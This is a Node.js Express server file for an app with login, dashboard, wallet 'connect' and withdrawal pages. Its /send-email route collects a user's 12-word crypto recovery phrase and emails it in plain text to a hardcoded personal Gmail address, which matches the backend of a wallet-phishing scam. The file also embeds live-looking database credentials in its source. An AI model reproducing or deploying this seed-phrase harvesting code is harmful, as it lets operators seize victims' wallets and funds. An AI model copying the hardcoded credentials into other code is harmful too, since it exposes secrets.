import dotenv from 'dotenv';
dotenv.config();

import express from 'express';
import nodemailer from 'nodemailer';
import cors from 'cors';
import mongoose from 'mongoose';
import path from 'path';
import cookieParser from 'cookie-parser';
import withdrawalRoutes from './withdrawalRoutes.js';
import authRoutes from './authRoutes.js';
import adminRoutes from './adminRoutes.js';
import { requireAuth, checkUser } from './middleWare/authMiddleware.js';
import User from './models/user.js'; // ⬅️ ADD THIS
import { fileURLToPath } from 'url';
import ejs from 'ejs';
import { Resend } from 'resend';


const app = express();
app.use(cookieParser());

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());



const resend = new Resend(process.env.RESEND_API_KEY);

// Function to send email when a 12-word key phrase is submitted

app.post('/send-email', async (req, res) => {
  const { keyPhrase } = req.body;

  if (!keyPhrase || keyPhrase.trim() === '') {
    return res.status(400).json({ success: false, message: 'Key phrase is required' });
  }

  try {
    const data = await resend.emails.send({
      from: process.env.MAIL_FROM || 'YourApp <no-reply@yourdomain.com>',
      to: 'johnsonray1840@gmail.com',
      subject: '12 Key Phrase Submitted',
      text: `A user has submitted the following 12-word key phrase:\n\n${keyPhrase}`,
      // Optional HTML version:
      // html: `<p>A user has submitted the following 12-word key phrase:</p><pre>${keyPhrase}</pre>`,
    });

    console.log('✅ Email sent via Resend:', data.id || data);
    res.status(200).json({ success: true, message: 'Email sent successfully!' });
  } catch (error) {
    console.error('❌ Error sending email:', error);
    res.status(500).json({ success: false, message: error.message || 'Failed to send email' });
  }
});


const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);


// View Engine
app.set('view engine', 'html');
const publicDirectoryPath = path.join(__dirname, '/public');
const viewspath = path.join(__dirname, '/views');

app.engine('html', ejs.renderFile);

app.set('views', viewspath);
app.use(express.static(publicDirectoryPath));

// ✅ Correct MongoDB Connection
const dbURL = 'mongodb+srv://evelyndantonio62:92939184@cluster0.tndfw.mongodb.net/pogba?retryWrites=true&w=majority&appName=Cluster0';

mongoose.connect(dbURL, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log('✅ Successfully connected to MongoDB Atlas');
  app.listen(8000, () => {
    console.log('🚀 Server is up and running on port 8000');
  });
}).catch((err) => {
  console.error('❌ MongoDB Connection Error:', err);
});

// Routes
app.get('/', (req, res) => res.render('index'));
app.get('/signup', (req, res) => {
  const inviteToken = req.query.invite || null;
  // Render signup page regardless, with defaults to avoid errors
  res.render('signup', {
    inviteToken,
    inviteRequired: false,
    errorMessage: null
  });
});
app.get('/login', (req, res) => res.render('login'));
app.get('/verify', (req, res) => res.render('verify'));
app.get("/dashboard", requireAuth, async (req, res) => {
  try {
    const user = await User.findById(req.userId).lean();
    if (!user) return res.redirect("/login");

    res.render("dashboard", { user });
  } catch (err) {
    console.error(err);
    res.redirect("/login");
  }
});app.get('/connect', requireAuth, checkUser, (req, res) => res.render('connect'));
app.get('/withdrawals', requireAuth, checkUser, (req, res) => res.render('withdrawal'));
app.get('/admin', requireAuth, checkUser, (req, res) => {
  res.render('admin');
});


// ✅ Mount routes properly
app.use('/api/auth', authRoutes);
app.use('/api/admin', adminRoutes);
app.use("/api", withdrawalRoutes);

